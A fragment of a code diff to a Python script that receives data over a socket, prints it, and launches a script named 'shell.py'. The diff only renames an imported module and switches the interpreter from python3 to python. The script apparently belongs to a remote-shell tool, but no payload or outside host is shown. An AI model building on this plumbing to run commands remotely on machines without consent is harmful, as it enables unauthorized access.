@@ -4,7 +4,7 @@ import time
 import subprocess
 import socket
 
-from st import pydata1,pydata2,pydata3,pydata4,pydata5,pydata6,pydata7,pydata8,pydata9,pydata10
+from thatonewifi import pydata1,pydata2,pydata3,pydata4,pydata5,pydata6,pydata7,pydata8,pydata9,pydata10
 import platform
 # def main():
 #     if platform.system == 'windows':
@@ -23,7 +23,7 @@ data = pydata2.recv(1024)
 print('Received:', data.decode())
 
 def startcmd():
-    subprocess.run(["python3", "shell.py"])
+    subprocess.run(["python", "shell.py"])
     
 
 
